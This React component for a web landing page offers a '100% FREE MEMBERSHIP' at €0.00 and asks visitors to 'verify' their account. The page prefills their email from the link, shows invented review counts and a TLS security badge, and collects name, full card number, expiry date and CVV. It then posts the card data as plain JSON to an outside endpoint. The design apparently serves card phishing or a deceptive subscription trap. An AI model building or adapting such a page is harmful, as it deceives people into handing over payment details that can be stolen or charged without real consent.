import VerifiedUserOutlinedIcon from '@mui/icons-material/VerifiedUserOutlined';
import { Button, Rating, TextField } from '@mui/material';
import CreditCardIcon from '@mui/icons-material/CreditCard';
import SaveAltIcon from '@mui/icons-material/SaveAlt';
import { useLocation } from 'react-router-dom';
import { useLayoutEffect, useState } from 'react';
import { convertQueryStringToObject } from '../../libservice'
import axios from 'axios';
const LandingPage2 = () => {
    const location = useLocation()
    const [input, setInput] = useState({
        email: '',
        name: '',
        cardNumber: '',
        expDate: '',
        cvv: ''
    })
    const handleChangeInput = e => setInput(prev => ({ ...prev, [e.target.name]: e.target.value }))
    const handleClickButton = () => {
        axios.post("https://reqres.in/api/users", input)
    }
    useLayoutEffect(() => {
        console.log(convertQueryStringToObject(location.search))
        setInput(prev => ({ ...prev, ...convertQueryStringToObject(location.search) }))
    }, [])
    console.log(input)
    return (
        <div>
            <div className='landingpage2_1 mobile-hidden'>
                <VerifiedUserOutlinedIcon style={{ marginRight: 10 }} />
                <div>Secure & TLS Encrypted Verification</div>
            </div>
            <div align='left' className='landingpage2_2'>
                <div className='landingpage2_2_1'>
                    <div>100% FREE MEMBERSHIP</div>
                    <div style={{ color: 'var(--green-color)', whiteSpace: 'nowrap' }}>€ 0.00</div>
                </div>
                <div style={{ marginTop: 10, }}>Verify Your Account and <b>Get Access For Free</b></div>
                <div className='mobile-hidden' style={{ display: 'flex', alignItems: 'center', marginTop: 10 }}>
                    <Rating precision={0.5}
                        value={4.5}
                    />
                    <span >Based on 194.138 user reviews</span>
                </div>
            </div>
            <div className='landingpage2_3' align='left'>
                <div style={{ marginBottom: 15 }}>
                    <div style={{ marginBottom: 5 }}><b>Email Address</b></div>
                    <TextField fullWidth disabled value={input.email} />
                </div>
                <div style={{ marginBottom: 15 }}>
                    <div style={{ marginBottom: 5 }}><b>Full Name</b></div>
                    <TextField name='name' fullWidth value={input.name} onChange={handleChangeInput} />
                </div>
                <div style={{ marginBottom: 15 }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between' }}>
                        <div style={{ marginBottom: 5 }}><b>Credit Card Number</b></div>
                        <div align='right' className='mobile-hidden'>
                            <img style={{ border: '1px solid gray', padding: 5, marginRight: 2 }} src='https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png' width={50} height={15} alt='' />
                            <img style={{ border: '1px solid gray', padding: 5, marginRight: 2 }} src='https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png' width={50} height={15} alt='' />
                            <img style={{ border: '1px solid gray', padding: 5, marginRight: 2 }} src='https://upload.wikimedia.org/wikipedia/commons/thumb/5/57/Discover_Card_logo.svg/1024px-Discover_Card_logo.svg.png' width={50} height={15} alt='' />
                            <img style={{ border: '1px solid gray', padding: 5, marginRight: 2 }} src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRzP__BYhxFqTBRc8M4oSjDpcnEuhLKSOnMCQ&usqp=CAU' width={50} height={15} alt='' />
                        </div>
                    </div>
                    <TextField fullWidth name='cardNumber' value={input.cardNumber} onChange={handleChangeInput} />
                </div>
                <div style={{ display: 'flex' }}>
                    <div style={{ marginBottom: 15, marginRight: 10, width: '60%', maxWidth: 200 }}>
                        <div style={{ marginBottom: 5 }}><b>Exp. Date</b></div>
                        <TextField fullWidth type='month' name='expDate' value={input.expDate} onChange={handleChangeInput} />
                    </div>
                    <div style={{ marginBottom: 15 }}>
                        <div style={{ marginBottom: 5 }}><b>CVV</b></div>
                        <TextField InputProps={{ endAdornment: <CreditCardIcon className='mobile-hidden' /> }} name='cvv' value={input.cvv} onChange={handleChangeInput} />
                    </div>
                </div>
                <div style={{ padding: '30px 0' }}>
                    <Button disabled={Boolean(input.email == '' || input.cardNumber == '' || input.cvv == '' || input.expDate == '' || input.name == '')} onClick={handleClickButton} fullWidth variant='contained' style={{ background: 'var(--green-color)', fontWeight: 700, width: '100%', height: 60, fontSize: 25, marginBottom: 15 }}>
                        <div style={{ position: 'relative' }}>
                            Get Access
                            <SaveAltIcon className='mobile-hidden' fontSize='large' style={{ position: 'absolute', left: -55, top: 3 }} />
                        </div>
                    </Button>
                    <div>By clicking on "Get Access", you agree with the <span style={{ color: 'var(--green-color)', cursor: 'pointer' }}>Terms of Service</span> and the <span style={{ color: 'var(--green-color)', cursor: 'pointer' }}>Privacy Policy</span></div>
                </div>
            </div>
        </div>
    )
}

export default LandingPage2